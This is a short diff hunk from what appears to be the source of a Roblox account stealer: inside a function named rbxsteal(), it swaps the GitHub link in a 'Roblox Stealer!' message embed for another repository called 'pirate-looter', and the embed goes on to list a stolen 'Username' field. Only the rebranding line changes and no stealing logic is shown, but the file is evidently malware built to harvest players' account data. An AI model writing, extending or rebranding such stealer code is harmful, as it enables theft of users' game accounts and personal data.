@@ -98,7 +98,7 @@ def rbxsteal():
     "embeds": [
         {
             "title": "Roblox Stealer!",
-            "description": "Github.com/Lawxsz/make-u-own-stealer",
+            "description": "github.com/real-fbdn/pirate-looter",
             "fields": [
          {
              "name": "Username",
